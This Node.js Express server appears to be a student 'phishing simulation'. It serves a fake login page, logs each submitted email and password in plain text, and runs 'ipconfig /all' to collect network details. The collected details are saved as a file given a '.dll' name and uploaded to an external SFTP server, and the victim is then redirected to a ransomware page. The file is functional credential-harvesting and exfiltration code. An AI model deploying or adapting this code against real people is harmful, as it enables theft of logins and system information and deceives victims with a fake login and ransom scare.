require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');
const SFTPClient = require('ssh2-sftp-client');

const sftp = new SFTPClient();
const app = express();
app.use(express.urlencoded({ extended: true })); // For form submission

// Serve static files from "public" folder (HTML, CSS)
app.use(express.static(path.join(__dirname, '../public')));

// Collect system information, create and upload the DLL file
async function collectAndUploadSystemInfo() {
    const systemTime = new Date().toString();
    const filePath = './data/systemInfo.txt';
    const dllPath = `./data/ComputerInfo${process.env.STUDENT_NUMBER}.dll`;

    // Write system time to a file
    fs.writeFileSync(filePath, `Time and Date: ${systemTime}\n`, { flag: 'a+' });

    // Capture network information (using ipconfig)
    exec('ipconfig /all', (error, stdout) => {
        if (error) {
            console.error('Error capturing network info:', error);
        } else {
            fs.writeFileSync(filePath, stdout, { flag: 'a+' });

            // Create the DLL file from the collected info
            const content = fs.readFileSync(filePath, 'utf-8');
            fs.writeFileSync(dllPath, content);

            // Upload the DLL file to SFTP server
            sftp.connect({
                host: process.env.SFTP_HOST,
                port: process.env.SFTP_PORT || '22',  // Default port 22
                username: process.env.SFTP_USERNAME,
                password: process.env.SFTP_PASSWORD
            }).then(() => {
                return sftp.put(dllPath, `/path/on/sftp/server/ComputerInfo${process.env.STUDENT_NUMBER}.dll`);
            }).then(() => {
                console.log('File uploaded successfully to SFTP');
                sftp.end();
            }).catch(err => {
                console.error('SFTP Upload Error:', err.message);
            });
        }
    });
}

// Handle form submission from fake-login.html
app.post('/submit-login', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;

    // Log credentials 
    console.log(`Captured credentials: Email: ${email}, Password: ${password}`);

    // Collect system info and upload to SFTP
    collectAndUploadSystemInfo();

    // Redirect to ransomware page
    res.redirect('/ransomware.html');
});

// Start the server
app.listen(3000, () => {
    console.log('Phishing simulation running on http://localhost:3000');
});
